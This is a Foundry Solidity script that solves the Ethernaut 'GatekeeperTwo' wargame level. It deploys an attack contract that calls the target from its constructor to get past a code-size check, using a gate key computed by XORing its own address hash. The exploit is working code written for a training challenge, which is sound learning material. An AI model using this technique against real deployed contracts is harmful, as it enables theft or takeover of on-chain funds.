// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {console2, Script} from "forge-std/Script.sol";
import {GatekeeperTwo} from "../../src/ethernaut/14_GatekeeperTwo.sol";

contract ExploitScript is Script {
    GatekeeperTwo public gatekeeperTwo =
        GatekeeperTwo(0x0D1970FaC15fDbE38f0C1579A6e13385C968330f);
    GatekeeperTwoAttack public gatekeeperTwoAttack;

    function run() public {
        vm.startBroadcast();
        gatekeeperTwoAttack = new GatekeeperTwoAttack(gatekeeperTwo);
        // console2.log(gatekeeperTwo.entrant());
        // console2.log(type(uint64).max);
        // bytes8 testGateKey = bytes8(
        //     keccak256(abi.encodePacked(address(gatekeeperTwoAttack)))
        // ) ^ 0xffffffffffffffff;
        // console2.log(uint64(testGateKey));
        // console2.log(
        //     uint64(
        //         bytes8(
        //             keccak256(abi.encodePacked(address(gatekeeperTwoAttack)))
        //         )
        //     ) ^ uint64(testGateKey)
        // );
        // console2.log(gatekeeperTwo.entrant());
        vm.stopBroadcast();
    }
}

contract GatekeeperTwoAttack {
    GatekeeperTwo public gatekeeperTwo;
    bytes8 public _gateKey;

    constructor(GatekeeperTwo _gatekeeperTwo) {
        _gateKey =
            bytes8(keccak256(abi.encodePacked(address(this)))) ^
            0xffffffffffffffff;
        gatekeeperTwo = _gatekeeperTwo;
        (bool success, ) = address(gatekeeperTwo).call(
            abi.encodeWithSignature("enter(bytes8)", _gateKey)
        );
    }

    function attack() public {}
}
